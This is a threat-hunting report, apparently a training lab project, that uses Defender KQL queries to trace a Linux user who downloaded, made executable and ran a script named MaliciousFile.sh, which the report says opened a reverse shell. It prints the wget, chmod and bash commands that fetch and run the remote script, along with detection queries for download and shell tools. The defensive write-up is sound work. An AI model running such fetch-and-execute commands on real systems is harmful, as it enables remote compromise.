<img width="400" src="https://github.com/user-attachments/assets/cf2bfe69-30da-4a79-aaa4-6d2f0509ecf8"/>

# Threat Hunt Report: Malicious File Execution
- [Scenario Creation](https://github.com/Goodka7/Threat-Hunting-Malicious-Execution-/blob/main/resources/Threat-Hunt-Event(Malicious%20Execution).md)

## Platforms and Languages Leveraged
- Linux (Ubuntu 22.04) Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Bash

## Scenario

Management has raised concerns about the increasing risk of malicious file execution within the organization. It has been noted that threat actors are leveraging social engineering tactics to trick employees into downloading or executing files that appear legitimate but are in fact malicious. These files, once executed, can initiate unauthorized actions on the network, such as establishing backdoors, escalating privileges, or exfiltrating sensitive data. While no direct incidents have been reported, there is a growing awareness of the potential for an attack, and management has requested a proactive review of systems to identify any evidence of malicious file execution and address potential security gaps.

The objective is to detect and analyze the logs, assess the potential security risks across multiple systems, and ensure that no malicious code is being executed.

## High-Level IoC Discovery Plan

- **Check `DeviceProcessEvents`** for suspicious executions of malicious files.

---

## Steps Taken

### 1. Searched the `DeviceProcessEvents` Table

Searched for processes running on the network, looking for any machines that were downloading or executing malicious processes. Some suspicious traffic was discovered and the scope of the search was narrowed down to specific device: `DeviceName` **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"** ran by `AccountName` **"baddog"**. 

Further narrowed down the search criteria to the `AccountName` **"baddog"**. 

At **Feb 4, 2025 10:14:39 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
wget https://raw.githubusercontent.com/Goodka7/Threat-Hunting-Malicious-Execution-/refs/heads/main/resources/MaliciousFile.sh
```

This command downloaded a bash script titled "MaliciousFile".

At **Feb 4, 2025 10:15:37 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
chmod +x MaliciousFile.sh
```

This command allows this file to be executable.

At **Feb 4, 2025 10:15:44 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
/bin/bash ./MaliciousFile.sh
```

This command executes the file "MaliciousFile.sh"

**Query used to locate events:**

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in ("wget", "curl", "bash", "python", "perl")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc

DeviceProcessEvents
| where AccountName == "baddog"
| where InitiatingProcessFileName in ("wget", "curl", "bash", "python", "perl")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc

DeviceProcessEvents
| where AccountName == "baddog"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

<img width="1212" alt="image" src="https://github.com/user-attachments/assets/73098074-6caa-4872-8fd6-e93644314017">
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/a377c590-acde-4076-b04b-7062e462c148">

---

### Chronological Event Timeline

### 1. **File Download - Malicious Script Downloaded**
- **Time:** `Feb 4, 2025 10:14:39 AM`
- **Event:** The employee **"baddog"** downloaded a malicious script titled "MaliciousFile.sh".
- **Action:** File download detected.
- **File Path:** `MaliciousFile.sh`
- **Command:** 
    ```
    wget https://raw.githubusercontent.com/Goodka7/Threat-Hunting-Malicious-Execution-/refs/heads/main/resources/MaliciousFile.sh
    ```

### 2. **Process Execution - Making the Malicious Script Executable**
- **Time:** `Feb 4, 2025 10:15:37 AM`
- **Event:** The employee **"baddog"** executed the command to make the malicious file executable.
- **Action:** Process execution detected.
- **Command:** 
    ```
    chmod +x MaliciousFile.sh
    ```

### 3. **Process Execution - Executing the Malicious Script**
- **Time:** `Feb 4, 2025 10:15:44 AM`
- **Event:** The employee **"baddog"** executed the malicious script, initiating the reverse shell and other arbitrary commands as defined in the script.
- **Action:** Process execution detected.
- **Command:** 
    ```
    /bin/bash ./MaliciousFile.sh
    ```

---

## Summary

The user "baddog" on the device "thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net" downloaded and executed a malicious script titled "MaliciousFile.sh," which was retrieved from a public URL. The script, once executed, performed arbitrary commands such as logging system information, creating files, and attempting to establish a reverse shell.

The execution of this script was likely intentional, its actions exposed the system to a potential security breach by initiating a reverse shell connection, which could allow unauthorized access to the machine. The script's activity suggests a possible compromise of the system through the execution of downloaded malicious files, potentially providing remote access for further exploitation.

---

## Response Taken

The execution of a malicious file and the associated actions by the user "baddog" on the endpoint **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"** were confirmed. The device was immediately isolated from the network to prevent further risks.

I suggest the malicious file be removed from the system and any associated backdoors be disabled. The employee's direct manager was notified, and a recommendation was made to educate the employee on the risks of executing unverified or suspicious files and the importance of practicing safe computing practices.

Further monitoring should be conducted to ensure no unauthorized access or data exfiltration occurred during the period of compromise.

---
